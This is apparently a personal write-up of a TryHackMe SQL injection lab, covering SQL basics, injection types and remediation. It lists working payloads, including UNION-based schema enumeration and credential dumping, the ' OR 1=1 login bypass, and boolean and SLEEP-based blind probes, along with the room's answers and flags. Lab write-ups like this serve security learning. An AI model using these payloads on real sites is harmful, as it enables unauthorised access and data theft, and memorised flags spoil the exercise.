# SQL Injection

**Date:** 30.03.2026
**Platform** THM

## Task 1.Brief

SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed.

### What does SQL stand for?

Structured Query Language

## Task 2.What is a Database?

A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS, which is an acronym for  Database Management System.

### What is the acronym for the software that controls a database?

DBMS

### What is the name of the grid-like structure which holds the data?

Table

## Task 3. What is SQL?

SQL (Structured Query Language) is a feature-rich language used for querying databases.

SELECT query used to retrieve data from the database.

**select * from users;**

The INSERT statement tells the database we wish to insert a new row of data into the table

**insert into users (username,password) values ('bob','password123');**

The UPDATE statement tells the database we wish to update one or more rows of data within a table.

**update users SET username='root',password='pass123' where username='admin';**

The DELETE statement tells the database we wish to delete one or more rows of data.

**delete from users where username='martin';**

**delete from users;**

### What SQL statement is used to retrieve data?

Select

### What SQL clause can be used to retrieve data from multiple tables?

Union

### What SQL statement is used to add data?

Insert

## Task 4.What is SQL Injection?

The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query

Let's pretend article ID 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:
 
https://website.thm/blog?id=2;--

Which would then, in turn, produce the SQL statement:

SELECT * from blog where id=2;-- and private=0 LIMIT 1;

The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

SELECT * from blog where id=2;--

Which will return the article with an ID of 2 whether it is set to public or not.

### What character signifies the end of an SQL query?

;

## Task 5. In-Band SQLi

In-Band SQL Injection

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

 

Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 

 

Union-Based SQL Injection
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

**LEVEL 1**

1. 1 UNION SELECT 1

Error message informing that the UNION SELECT statement has a different number of columns than the original SELECT query

2. 1 UNION SELECT 1,2

Same error

3. 1 UNION SELECT 1,2,3

Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article

4. 0 UNION SELECT 1,2,3

Now see the article is just made up of the result from the UNION select, returning the column values 1, 2, and 3

5. 0 UNION SELECT 1,2,database()

Now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one

6. 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 

7. 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users

8. 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

### What is the flag after completing level 1?

THM{SQL_INJECTION_3840}

## Task 6.Blind SQLi-Authentication Bypass

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successfully enumerate a whole database.

**LEVEL 2**

1. Enter the following into the password field:

**' OR 1=1;--**

Which turns the SQL query into the following:


**select * from users where username='' and password='' OR 1=1;**

### What is the flag after completing level two?

THM{SQL_INJECTION_9581}

## Task 7.Blind SQLi-Boolean Based

Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not

**Level 3**

1. admin123' UNION SELECT 1;-- 

As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns.

2. admin123' UNION SELECT 1,2,3 where database() like 's%';--

True

3. admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

This query looks for results in the information_schema database in the tables table where the database name matches sqli_three, and the table name begins with the letter a

4. admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

5. admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

6. admin123' UNION SELECT 1,2,3 from users where username like 'a%

7. admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

Cycling through all the characters, you'll discover the password is 3845.

### What is the flag after completing level three?

THM{SQL_INJECTION_1093}

## Task 8.Blind-SQLi-Time Based

A time-based blind SQL injection is very similar to the above boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement

**Level 4**

1. admin123' UNION SELECT SLEEP(5);--

2. admin123' UNION SELECT SLEEP(5),2;--

This payload have produced a 5.002 second delay, confirming the successful execution of the UNION statement and that there are two columns

3. referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

### What is the final flag after completing level four?

THM{SQL_INJECTION_MASTER}

## Task 9.Out-of-Band SQLi

Out-of-band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database, which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

### Name a protocol beginning with D that can be used to exfiltrate data from a database.

DNS

## Task 10. Remediation

As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:



Prepared Statements (With Parameterized Queries):

In a prepared query, the first thing a developer writes is the SQL query, and then any user inputs are added as parameters afterwards. Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look much cleaner and easier to read.



Input Validation:

Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 



Escaping User Input:

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.

### Name a method of protecting yourself from an SQL Injection exploit.

Prepared Statements